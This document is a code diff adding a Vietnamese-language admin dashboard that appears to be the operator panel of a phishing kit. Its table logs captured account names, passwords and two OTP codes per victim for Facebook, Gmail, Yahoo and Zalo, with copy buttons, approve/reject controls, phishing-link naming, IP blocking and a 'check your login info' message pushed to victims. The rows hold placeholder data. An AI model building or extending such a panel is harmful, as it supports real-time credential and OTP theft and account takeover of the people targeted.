@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        :root {
+            --sidebar-bg: #232946;
+            --sidebar-text: #fff;
+            --sidebar-accent: #ffd803;
+            --sidebar-highlight: #ffb800;
+            --stat-bg: #f4f6fb;
+            --stat-text: #232946;
+            --main-bg: #f4f6fb;
+            --main-text: #232946;
+        }
+        body.dark-mode {
+            --sidebar-bg: #181c2f;
+            --sidebar-text: #fff;
+            --sidebar-accent: #ffd803;
+            --sidebar-highlight: #ffb800;
+            --stat-bg: #232946;
+            --stat-text: #ffd803;
+            --main-bg: #181c2f;
+            --main-text: #fff;
+        }
+        body {
+            background: var(--main-bg);
+            color: var(--main-text);
+        }
+        .sidebar {
+            position: fixed;
+            top: 0; left: 0; bottom: 0;
+            width: 220px;
+            background: var(--sidebar-bg);
+            color: var(--sidebar-text);
+            padding: 24px 12px 12px 12px;
+            z-index: 1000;
+            min-height: 100vh;
+            transition: border-radius 0.3s;
+        }
+        .sidebar .hello {
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: var(--sidebar-accent);
+            margin-bottom: 18px;
+        }
+        .sidebar .stat-box {
+            background: var(--stat-bg);
+            color: var(--stat-text);
+            border-radius: 12px;
+            padding: 16px 12px;
+            margin-bottom: 24px;
+        }
+        .sidebar .stat-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+            font-size: 1rem;
+        }
+        .sidebar .stat-row:last-child { margin-bottom: 0; }
+        .sidebar .stat-value {
+            font-weight: bold;
+            color: #1faa5b;
+        }
+        .sidebar .menu {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+        .sidebar .menu li {
+            margin-bottom: 12px;
+        }
+        .sidebar .menu a {
+            color: var(--sidebar-text);
+            text-decoration: none;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            padding: 8px 12px;
+            border-radius: 6px;
+            transition: background 0.2s;
+        }
+        .sidebar .menu a:hover {
+            background: var(--sidebar-highlight);
+            color: #232946;
+        }
+        .sidebar .menu i {
+            margin-right: 10px;
+        }
+        .toggle-dark, .toggle-full {
+            position: absolute;
+            top: 18px;
+            background: var(--sidebar-accent);
+            color: #232946;
+            border: none;
+            border-radius: 50%;
+            width: 36px; height: 36px;
+            display: flex; align-items: center; justify-content: center;
+            cursor: pointer;
+            z-index: 1100;
+        }
+        .toggle-dark { right: 18px; }
+        .toggle-full { right: 64px; }
+        .main-content {
+            margin-left: 240px;
+            padding: 32px 24px 24px 24px;
+            transition: border-radius 0.3s;
+        }
+        .fullscreen .sidebar {
+            border-radius: 32px 0 0 32px;
+        }
+        .fullscreen .main-content {
+            border-radius: 0 32px 32px 0;
+            background: #fff;
+            box-shadow: 0 2px 16px rgba(0,0,0,0.08);
+        }
+        .quick-actions {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+        .quick-actions .btn {
+            font-weight: 500;
+            border-radius: 8px;
+            min-width: 160px;
+        }
+        .access-log-table {
+            background: #fff;
+            border-radius: 12px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+            padding: 18px;
+        }
+        .access-log-table table {
+            font-size: 0.92em;
+            width: 100%;
+            table-layout: auto;
+        }
+        .access-log-table th {
+            min-width: 70px;
+            white-space: normal;
+        }
+        .access-log-table th, .access-log-table td {
+            padding: 4px 6px;
+            vertical-align: middle;
+            word-break: break-word;
+        }
+        .access-log-table td {
+            white-space: normal;
+        }
+        .copy-btn {
+            font-size: 0.9em;
+            color: #1faa5b;
+            cursor: pointer;
+            margin-left: 6px;
+        }
+        .search-bar {
+            margin-bottom: 16px;
+            display: flex;
+            gap: 12px;
+            flex-wrap: nowrap;
+        }
+        .search-bar > * {
+            flex: 1 1 0;
+            min-width: 0;
+        }
+        @media (max-width: 900px) {
+            .sidebar { width: 60px; padding: 12px 4px; }
+            .sidebar .hello, .sidebar .stat-box, .sidebar .menu span { display: none; }
+            .sidebar .menu a { justify-content: center; }
+            .main-content { margin-left: 70px; }
+            .search-bar {
+                flex-wrap: wrap;
+            }
+        }
+        @media (max-width: 600px) {
+            .sidebar { position: static; width: 100%; min-height: unset; }
+            .main-content { margin-left: 0; padding: 12px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="sidebar">
+        <button class="toggle-dark" id="toggleDark" title="Chuyển chế độ sáng/tối"><i class="fas fa-moon"></i></button>
+        <button class="toggle-full" id="toggleFull" title="Chuyển chế độ full màn hình"><i class="fas fa-expand"></i></button>
+        <div class="hello">👋 Hello <span id="adminName">Bong</span>!</div>
+        <div class="stat-box">
+            <div class="stat-row">Online <span class="stat-value" id="statOnline">12</span></div>
+            <div class="stat-row">Thành Công <span class="stat-value" id="statSuccess">98</span></div>
+            <div class="stat-row">Lượt Truy Cập <span class="stat-value" id="statAccess">1234</span></div>
+            <div class="stat-row">Lượt Thất Bại <span class="stat-value text-danger" id="statFail">5</span></div>
+        </div>
+        <ul class="menu">
+            <li><a href="#"><i class="fas fa-tachometer-alt"></i> <span>Bảng Điều Khiển</span></a></li>
+            <li><a href="#"><i class="fas fa-users"></i> <span>DS Thí Sinh</span></a></li>
+            <li><a href="#"><i class="fas fa-list-alt"></i> <span>DS Cuộc Thi</span></a></li>
+            <li><a href="#"><i class="fas fa-link"></i> <span>API Kết Nối</span></a></li>
+            <li><a href="#"><i class="fas fa-cog"></i> <span>Cài Đặt Web</span></a></li>
+            <li><a href="#"><i class="fas fa-sign-out-alt"></i> <span>Đăng Xuất</span></a></li>
+        </ul>
+    </div>
+    <div class="main-content">
+        <div class="quick-actions mb-4">
+            <button class="btn btn-warning"><i class="fas fa-bell"></i> Cài Đặt Thông Báo</button>
+            <button class="btn btn-primary"><i class="fas fa-link"></i> Tạo Tên Link</button>
+            <button class="btn btn-danger"><i class="fas fa-ban"></i> Chặn IP</button>
+            <button class="btn btn-info"><i class="fab fa-facebook"></i> Facebook</button>
+            <button class="btn btn-danger"><i class="fab fa-google"></i> Gmail</button>
+            <button class="btn btn-secondary"><i class="fab fa-yahoo"></i> Yahoo</button>
+            <button class="btn btn-success"><i class="fab fa-facebook-messenger"></i> Zalo</button>
+        </div>
+        <!-- Thanh tìm kiếm và lọc -->
+        <div class="search-bar">
+            <input type="text" class="form-control" id="searchAccount" placeholder="Tìm tài khoản...">
+            <input type="text" class="form-control" id="searchIP" placeholder="Tìm IP...">
+            <select class="form-select" id="searchStatus">
+                <option value="">Tất cả trạng thái</option>
+                <option value="success">Thành công</option>
+                <option value="fail">Thất bại</option>
+            </select>
+            <select class="form-select" id="searchProvider">
+                <option value="">Tất cả nền tảng</option>
+                <option value="facebook">Facebook</option>
+                <option value="gmail">Gmail</option>
+                <option value="yahoo">Yahoo</option>
+                <option value="zalo">Zalo</option>
+            </select>
+            <button class="btn btn-outline-primary" onclick="filterTable()"><i class="fas fa-search"></i> Lọc</button>
+        </div>
+        <div class="access-log-table">
+            <h5 class="mb-3">Bảng Danh Sách Truy Cập</h5>
+            <table class="table table-bordered align-middle" id="logTable">
+                <thead class="table-light">
+                    <tr>
+                        <th>STT</th>
+                        <th>Tên Link</th>
+                        <th>Tài Khoản</th>
+                        <th>Mật Khẩu</th>
+                        <th>OTP Login</th>
+                        <th>OTP User</th>
+                        <th>Thiết Bị IP</th>
+                        <th>Thời Gian</th>
+                        <th>Kết Nối API</th>
+                        <th>Thông Báo</th>
+                        <th>Phê Duyệt</th>
+                        <th>Kết Quả</th>
+                    </tr>
+                </thead>
+                <tbody id="logTableBody">
+                    <!-- Dữ liệu mẫu, thay bằng dữ liệu động từ backend -->
+                    <tr data-status="success" data-provider="facebook">
+                        <td>1</td>
+                        <td>link-phu-1</td>
+                        <td>user01</td>
+                        <td>123456 <span class="copy-btn" onclick="copyText('123456')">Copy</span></td>
+                        <td>OTP123 <span class="copy-btn" onclick="copyText('OTP123')">Copy</span></td>
+                        <td>OTP789 <span class="copy-btn" onclick="copyText('OTP789')">Copy</span></td>
+                        <td>192.168.1.1 <span class="copy-btn" onclick="copyText('192.168.1.1')">Copy</span></td>
+                        <td>01/06/2024 - 10:00</td>
+                        <td><i class="fab fa-facebook text-primary"></i></td>
+                        <td><button class="btn btn-sm btn-warning" onclick="showNotifyPopup('user01')">Gửi</button></td>
+                        <td><button class="btn btn-sm btn-success">Phê Duyệt</button></td>
+                        <td><span class="text-success fw-bold">✅</span></td>
+                    </tr>
+                    <tr data-status="fail" data-provider="gmail">
+                        <td>2</td>
+                        <td>link-phu-2</td>
+                        <td>user02</td>
+                        <td>abcdef <span class="copy-btn" onclick="copyText('abcdef')">Copy</span></td>
+                        <td>OTP456 <span class="copy-btn" onclick="copyText('OTP456')">Copy</span></td>
+                        <td>OTP999 <span class="copy-btn" onclick="copyText('OTP999')">Copy</span></td>
+                        <td>10.0.0.2 <span class="copy-btn" onclick="copyText('10.0.0.2')">Copy</span></td>
+                        <td>01/06/2024 - 10:05</td>
+                        <td><i class="fab fa-google text-danger"></i></td>
+                        <td><button class="btn btn-sm btn-warning" onclick="showNotifyPopup('user02')">Gửi</button></td>
+                        <td><button class="btn btn-sm btn-danger">Từ Chối</button></td>
+                        <td><span class="text-danger fw-bold">❌</span></td>
+                    </tr>
+                    <!-- ... -->
+                </tbody>
+            </table>
+            <!-- Phân trang mẫu -->
+            <nav>
+                <ul class="pagination mt-3">
+                    <li class="page-item disabled"><a class="page-link" href="#">Trước</a></li>
+                    <li class="page-item active"><a class="page-link" href="#">1</a></li>
+                    <li class="page-item"><a class="page-link" href="#">2</a></li>
+                    <li class="page-item"><a class="page-link" href="#">3</a></li>
+                    <li class="page-item"><a class="page-link" href="#">Sau</a></li>
+                </ul>
+            </nav>
+        </div>
+    </div>
+    <!-- Popup gửi thông báo -->
+    <div class="modal fade" id="notifyModal" tabindex="-1" aria-labelledby="notifyModalLabel" aria-hidden="true">
+      <div class="modal-dialog">
+        <div class="modal-content">
+          <div class="modal-header">
+            <h5 class="modal-title" id="notifyModalLabel">Gửi thông báo nhanh</h5>
+            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+          </div>
+          <div class="modal-body">
+            <form id="notifyForm">
+              <div class="mb-3">
+                <label for="notifyUser" class="form-label">Tài khoản nhận</label>
+                <input type="text" class="form-control" id="notifyUser" readonly>
+              </div>
+              <div class="mb-3">
+                <label for="notifyContent" class="form-label">Nội dung thông báo</label>
+                <textarea class="form-control" id="notifyContent" rows="3" required>Thông báo mẫu: Vui lòng kiểm tra lại thông tin đăng nhập!</textarea>
+              </div>
+              <button type="submit" class="btn btn-primary">Gửi</button>
+            </form>
+          </div>
+        </div>
+      </div>
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        // Dark mode toggle
+        document.getElementById('toggleDark').onclick = function() {
+            document.body.classList.toggle('dark-mode');
+        };
+        // Fullscreen toggle
+        document.getElementById('toggleFull').onclick = function() {
+            document.body.classList.toggle('fullscreen');
+            var icon = this.querySelector('i');
+            if(document.body.classList.contains('fullscreen')) {
+                icon.classList.remove('fa-expand');
+                icon.classList.add('fa-compress');
+            } else {
+                icon.classList.remove('fa-compress');
+                icon.classList.add('fa-expand');
+            }
+        };
+        // Copy to clipboard
+        function copyText(text) {
+            navigator.clipboard.writeText(text);
+            alert('Đã sao chép: ' + text);
+        }
+        // Popup gửi thông báo
+        function showNotifyPopup(user) {
+            document.getElementById('notifyUser').value = user;
+            document.getElementById('notifyContent').value = 'Thông báo mẫu: Vui lòng kiểm tra lại thông tin đăng nhập!';
+            var modal = new bootstrap.Modal(document.getElementById('notifyModal'));
+            modal.show();
+        }
+        document.getElementById('notifyForm').onsubmit = function(e) {
+            e.preventDefault();
+            alert('Đã gửi thông báo tới: ' + document.getElementById('notifyUser').value);
+            bootstrap.Modal.getInstance(document.getElementById('notifyModal')).hide();
+        };
+        // Lọc bảng log
+        function filterTable() {
+            var account = document.getElementById('searchAccount').value.toLowerCase();
+            var ip = document.getElementById('searchIP').value;
+            var status = document.getElementById('searchStatus').value;
+            var provider = document.getElementById('searchProvider').value;
+            var rows = document.querySelectorAll('#logTableBody tr');
+            rows.forEach(function(row) {
+                var show = true;
+                if(account && !row.cells[2].textContent.toLowerCase().includes(account)) show = false;
+                if(ip && !row.cells[6].textContent.includes(ip)) show = false;
+                if(status && row.getAttribute('data-status') !== status) show = false;
+                if(provider && row.getAttribute('data-provider') !== provider) show = false;
+                row.style.display = show ? '' : 'none';
+            });
+        }
+    </script>
+</body>
+</html>
